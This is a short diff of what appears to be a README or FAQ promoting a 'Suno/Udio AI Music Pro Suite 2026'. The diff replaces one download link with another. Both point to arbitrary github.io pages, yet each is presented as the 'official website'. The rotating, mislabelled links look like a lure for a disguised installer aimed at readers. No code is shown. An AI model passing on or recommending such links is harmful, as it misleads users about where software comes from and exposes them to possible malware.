@@ -62,4 +62,4 @@ A5: No, this suite is a one-time download with no recurring fees. All features a
 
 To get started with the Suno/Udio AI Music Pro Suite 2026, download the installer from the link below:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
